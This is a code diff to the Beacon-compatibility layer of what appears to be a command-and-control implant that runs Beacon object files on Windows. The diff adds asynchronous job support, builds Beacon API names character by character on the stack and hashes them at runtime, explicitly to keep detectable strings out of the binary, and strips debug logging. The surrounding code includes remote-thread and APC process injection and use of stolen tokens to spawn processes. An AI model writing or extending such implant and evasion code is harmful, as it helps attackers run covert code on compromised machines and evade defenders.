@@ -17,12 +17,16 @@
 #include "Identity.h"
 #include "Utils.h"
 
-#if defined(INCLUDE_CMD_INJECT_SHELLCODE) || defined(INCLUDE_CMD_INLINE_EXECUTE)
+#if defined(INCLUDE_CMD_INJECT_SHELLCODE) || defined(INCLUDE_CMD_INLINE_EXECUTE) || defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
 
 #ifdef _WIN32
 #include <windows.h>
 
 #include "BeaconCompatibility.h"
+
+#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+#include "Tasks/AsyncBof.h"
+#endif
 
 #ifdef _WIN64
 #define X86PATH "SysWOW64"
@@ -66,7 +70,13 @@
 #define FreeLibrary_HASH 0xAB45C5EE
 #define __C_specific_handler_HASH 0x174C6982
 
-unsigned char* InternalFunctions[30][2] = {
+/* Indices for async APIs — hashes filled at runtime to avoid Beacon* strings in .rdata */
+#define IDX_BeaconWakeup                   28
+#define IDX_BeaconGetStopJobEvent          29
+#define IDX_BeaconRegisterThreadCallback   30
+#define IDX_BeaconUnregisterThreadCallback 31
+
+unsigned char* InternalFunctions[INTERNAL_FUNCTIONS_COUNT][2] = {
     {(uint32_t)BeaconDataParse_HASH, (unsigned char*)BeaconDataParse},
     {(uint32_t)BeaconDataInt_HASH, (unsigned char*)BeaconDataInt},
     {(uint32_t)BeaconDataShort_HASH, (unsigned char*)BeaconDataShort},
@@ -95,7 +105,46 @@ unsigned char* InternalFunctions[30][2] = {
     {(uint32_t)GetModuleHandleA_HASH, (unsigned char*)GetModuleHandleA},
     {(uint32_t)FreeLibrary_HASH, (unsigned char*)FreeLibrary},
     {(uint32_t)__C_specific_handler_HASH, (unsigned char*)NULL},
+    {(uint32_t)0, (unsigned char*)BeaconWakeup},
+    {(uint32_t)0, (unsigned char*)BeaconGetStopJobEvent},
+    {(uint32_t)0, (unsigned char*)BeaconRegisterThreadCallback},
+    {(uint32_t)0, (unsigned char*)BeaconUnregisterThreadCallback},
+    {(uint32_t)0, (unsigned char*)NULL},
+    {(uint32_t)0, (unsigned char*)NULL},
 };
+
+void BeaconCompatibilityEnsureHashes(void)
+{
+    static BOOL init = FALSE;
+    char n[40];
+
+    if (init)
+        return;
+
+    /* Build names on the stack (avoids contiguous Beacon* strings in .rdata) */
+    n[0]='B'; n[1]='e'; n[2]='a'; n[3]='c'; n[4]='o'; n[5]='n';
+    n[6]='W'; n[7]='a'; n[8]='k'; n[9]='e'; n[10]='u'; n[11]='p'; n[12]=0;
+    InternalFunctions[IDX_BeaconWakeup][0] = (unsigned char*)(ULONG_PTR)custom_hash(n);
+
+    n[0]='B'; n[1]='e'; n[2]='a'; n[3]='c'; n[4]='o'; n[5]='n';
+    n[6]='G'; n[7]='e'; n[8]='t'; n[9]='S'; n[10]='t'; n[11]='o'; n[12]='p';
+    n[13]='J'; n[14]='o'; n[15]='b'; n[16]='E'; n[17]='v'; n[18]='e'; n[19]='n'; n[20]='t'; n[21]=0;
+    InternalFunctions[IDX_BeaconGetStopJobEvent][0] = (unsigned char*)(ULONG_PTR)custom_hash(n);
+
+    n[0]='B'; n[1]='e'; n[2]='a'; n[3]='c'; n[4]='o'; n[5]='n';
+    n[6]='R'; n[7]='e'; n[8]='g'; n[9]='i'; n[10]='s'; n[11]='t'; n[12]='e'; n[13]='r';
+    n[14]='T'; n[15]='h'; n[16]='r'; n[17]='e'; n[18]='a'; n[19]='d';
+    n[20]='C'; n[21]='a'; n[22]='l'; n[23]='l'; n[24]='b'; n[25]='a'; n[26]='c'; n[27]='k'; n[28]=0;
+    InternalFunctions[IDX_BeaconRegisterThreadCallback][0] = (unsigned char*)(ULONG_PTR)custom_hash(n);
+
+    n[0]='B'; n[1]='e'; n[2]='a'; n[3]='c'; n[4]='o'; n[5]='n';
+    n[6]='U'; n[7]='n'; n[8]='r'; n[9]='e'; n[10]='g'; n[11]='i'; n[12]='s'; n[13]='t'; n[14]='e'; n[15]='r';
+    n[16]='T'; n[17]='h'; n[18]='r'; n[19]='e'; n[20]='a'; n[21]='d';
+    n[22]='C'; n[23]='a'; n[24]='l'; n[25]='l'; n[26]='b'; n[27]='a'; n[28]='c'; n[29]='k'; n[30]=0;
+    InternalFunctions[IDX_BeaconUnregisterThreadCallback][0] = (unsigned char*)(ULONG_PTR)custom_hash(n);
+
+    init = TRUE;
+}
 
 char* beacon_compatibility_output = NULL;
 int beacon_compatibility_size = 0;
@@ -248,10 +297,35 @@ void BeaconFormatInt(formatp* format, int value) {
 /* Main output functions */
 
 void BeaconPrintf(int type, char* fmt, ...) {
-    /* Change to maintain internal buffer, and return after done running. */
     int length = 0;
     char* tempptr = NULL;
     va_list args;
+    char* formatted = NULL;
+
+    (void)type;
+
+#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+    {
+        PASYNC_BOF_CONTEXT actx = AsyncBofGetOutputContext();
+        if (actx) {
+            va_start(args, fmt);
+            length = vsnprintf(NULL, 0, fmt, args);
+            va_end(args);
+            if (length < 0)
+                return;
+            formatted = (char*)malloc(length + 1);
+            if (!formatted)
+                return;
+            va_start(args, fmt);
+            vsnprintf(formatted, length + 1, fmt, args);
+            va_end(args);
+            AsyncBofAppendOutput(actx, formatted, length);
+            free(formatted);
+            return;
+        }
+    }
+#endif
+
     va_start(args, fmt);
     vprintf(fmt, args);
     va_end(args);
@@ -275,6 +349,19 @@ void BeaconPrintf(int type, char* fmt, ...) {
 
 void BeaconOutput(int type, char* data, int len) {
     char* tempptr = NULL;
+
+    (void)type;
+
+#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+    {
+        PASYNC_BOF_CONTEXT actx = AsyncBofGetOutputContext();
+        if (actx) {
+            AsyncBofAppendOutput(actx, data, len);
+            return;
+        }
+    }
+#endif
+
     tempptr = realloc(beacon_compatibility_output, beacon_compatibility_size + len + 1);
     beacon_compatibility_output = tempptr;
     if (tempptr == NULL) {
@@ -291,14 +378,12 @@ void BeaconOutput(int type, char* data, int len) {
  * Beacon Token Functions
  */
 BOOL BeaconUseToken(HANDLE token) {
-    _dbg("[BAPI] Called  BeaconUseToken");
     /* Probably needs to handle DuplicateTokenEx too */
     SetThreadToken(NULL, token);
     return TRUE;
 }
 
 void BeaconRevertToken(void) {
-    _dbg("[BAPI] Called  BeaconRevertToken");
     if (!RevertToSelf()) {
         _err("\t Failed to revert token identity.");
     }
@@ -306,7 +391,6 @@ void BeaconRevertToken(void) {
 }
 
 BOOL BeaconIsAdmin(void) {
-    _dbg("[BAPI] Called BeaconIsAdmin ");
     return IdentityIsAdmin();
 }
 
@@ -314,7 +398,6 @@ BOOL BeaconIsAdmin(void) {
  *
  */
 void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
-    _dbg("[BAPI] Called BeaconGetSpawnTo ");
 
 	CHAR tempBufferPath [MAX_PATH * 2];
 
@@ -339,7 +422,6 @@ void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
 
 
 BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo) {
-    _dbg("[BAPI] Called BeaconSpawnTemporaryProcess ");
 
     
     BOOL bSuccess = FALSE;
@@ -357,13 +439,11 @@ BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo,
     /* Use stolen token if available and not explicitly ignored */
     if ( !ignoreToken && gIdentityToken != NULL )
     {
-        _dbg("\t Using impersonated token for process creation");
         
         /* Convert path to wide characters for CreateProcessWithTokenW */
         if (MultiByteToWideChar(CP_ACP, 0, lpPath, -1, lpPathW, sizeof(lpPathW) / sizeof(WCHAR)) == 0)
         {
             DWORD error = GetLastError();
-            _err("\t Failed to convert path to wide char: %d", error);
             return FALSE;
         }
         
@@ -409,7 +489,6 @@ BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo,
 
 
 void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len) {
-    _dbg("[BAPI] Called BeaconInjectProcess ");
 
     /* Basic explicit process injection (CreateRemoteThread) */
     LPVOID remoteBuf = NULL;
@@ -459,7 +538,6 @@ void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_
 
 // Placeholder injection technique for Beacon API
 void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len) {
-    _dbg("[BAPI] Called BeaconInjectTemporaryProcess ");
 
     /* Basic spawn process injection (QueueUserAPC) */
     HANDLE hProc                    = pInfo->hProcess;
@@ -531,7 +609,50 @@ char* BeaconGetOutputData(int* outsize) {
     return outdata;
 }
 
+void BeaconWakeup(void)
+{
+#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+    AsyncBofSignalWakeup();
+#endif
+}
+
+HANDLE BeaconGetStopJobEvent(void)
+{
+#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+    PASYNC_BOF_CONTEXT ctx = AsyncBofGetOutputContext();
+    if (ctx)
+        return ctx->hStopEvent;
+#endif
+    return NULL;
+}
+
+BOOL BeaconRegisterThreadCallback(DWORD dwThreadId)
+{
+#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+    /* Caller must already be on a registered async job thread */
+    PASYNC_BOF_CONTEXT ctx = AsyncBofFindByThreadId(GetCurrentThreadId());
+    if (!ctx)
+        return FALSE;
+    if (dwThreadId == 0)
+        dwThreadId = GetCurrentThreadId();
+    return AsyncBofRegisterThread(ctx, dwThreadId);
+#endif
+    (void)dwThreadId;
+    return FALSE;
+}
+
+void BeaconUnregisterThreadCallback(DWORD dwThreadId)
+{
+#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+    if (dwThreadId == 0)
+        dwThreadId = GetCurrentThreadId();
+    AsyncBofUnregisterThread(dwThreadId);
+#else
+    (void)dwThreadId;
+#endif
+}
+
 #endif
 
 
-#endif //INCLUDE_CMD_INLINE_EXECUTE
+#endif //INCLUDE_CMD_INLINE_EXECUTE || INJECT || ASYNC
